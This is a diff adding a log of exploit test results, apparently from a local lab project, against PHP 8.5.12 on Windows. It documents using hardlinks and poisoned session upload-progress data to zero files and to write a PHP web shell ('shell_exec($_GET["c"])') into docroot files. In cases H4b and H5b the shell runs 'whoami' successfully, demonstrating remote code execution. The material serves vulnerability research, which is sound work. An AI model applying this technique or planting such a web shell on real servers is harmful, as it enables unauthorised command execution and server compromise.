@@ -1,0 +1,35 @@
+================ PHP 8512 (Windows ZTS) — HARDLINK lane ================
+ini save_path: C:/Users/andre/Downloads/php2shell-claude/wp4/win_lab/8512/sess
+--- H1 regular sess file + pipe poison (control)
+before: EXISTS size=18 nlink=1 head=pref|s:6:"keepme";
+after:  EXISTS size=0 nlink=1 head=
+--- H2 HARDLINK -> decodable target + pipe poison (zeroing primitive)
+target before: EXISTS size=18 nlink=2 head=pref|s:6:"keepme";
+link before:   HARDLINK/REGULAR nlink=2 size=18
+target after:  EXISTS size=0 nlink=2 head=
+link after:    HARDLINK/REGULAR nlink=2 size=0
+--- H3 HARDLINK -> decodable target + CLEAN key, cleanup=1 (restore semantics)
+target before: EXISTS size=18 nlink=2 head=pref|s:6:"keepme";
+target after:  EXISTS size=18 nlink=2 head=pref|s:6:"keepme";
+link after:    HARDLINK/REGULAR nlink=2 size=18
+--- H6 HARDLINK -> no-pipe php target + pipe poison (decode-fail negative)
+target before: EXISTS size=18 nlink=2 head=<?php echo "REAL";
+target after:  EXISTS size=18 nlink=1 head=<?php echo "REAL";
+link after:    GONE
+--- H8 HARDLINK -> EMPTY target + payload key, cleanup=1 (FILE_END wipe)
+target after:  EXISTS size=0 nlink=2 head=
+--- H4 HARDLINK -> docroot/empty.php (0 bytes) + payload key + cleanup=0
+shell before: EXISTS size=0 nlink=2 head=
+shell after:  EXISTS size=457 nlink=2 head=upload_progress_<?php echo "WP4_RCE_OK[".shell_exec($_GET["c
+shell content (first 300B):
+upload_progress_<?php echo "WP4_RCE_OK[".shell_exec($_GET["c"])."]"; ?>|a:5:{s:10:"start_time";i:1792810674;s:14:"content_length";i:65776;s:15:"bytes_processed";i:65776;s:4:"done";b:1;s:5:"files";a:1:{i:0;a:7:{s:10:"field_name";s:2:"f0";s:4:"name";s:9:"notes.txt";s:8:"tmp_name";s:74:"C:\Users\andre\
+--- H4b GET /empty.php?c=whoami
+upload_progress_WP4_RCE_OK[andre
+]|a:5:{s:10:"start_time";i:1792810674;s:14:"content_length";i:65776;s:15:"bytes_processed";i:65776;s:4:"done";b:1;s:5:"files";a:1:{i:0;a:7:{s:10:"field_name";s:2:"f0";
+--- H5 HARDLINK -> docroot/sessfmt.php (non-empty decodable) + payload + cleanup=0
+shell before: EXISTS size=18 nlink=2 head=pref|s:6:"keepme";
+shell after:  EXISTS size=475 nlink=2 head=pref|s:6:"keepme";upload_progress_<?php echo "WP4_RCE_OK[".s
+--- H5b GET /sessfmt.php?c=whoami
+pref|s:6:"keepme";upload_progress_WP4_RCE_OK[andre
+]|a:5:{s:10:"start_time";i:1792810675;s:14:"content_length";i:65776;s:15:"bytes_processed";i:65776;s:4:"done";b:1;s:5:"files";a:1:{i:0;a:7:{s:10:"fie
+=== end 8512 hardlink matrix ===
